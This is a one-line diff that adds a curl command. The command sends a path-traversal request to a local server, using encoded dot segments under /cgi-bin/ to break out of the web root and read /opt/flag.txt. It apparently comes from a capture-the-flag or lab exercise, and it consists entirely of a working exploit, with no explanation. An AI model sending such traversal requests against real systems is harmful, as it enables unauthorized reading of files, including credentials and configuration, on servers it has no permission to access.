@@ -1,0 +1,1 @@
+curl -v --path-as-is 'http://127.0.0.1:8001/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/opt/flag.txt'
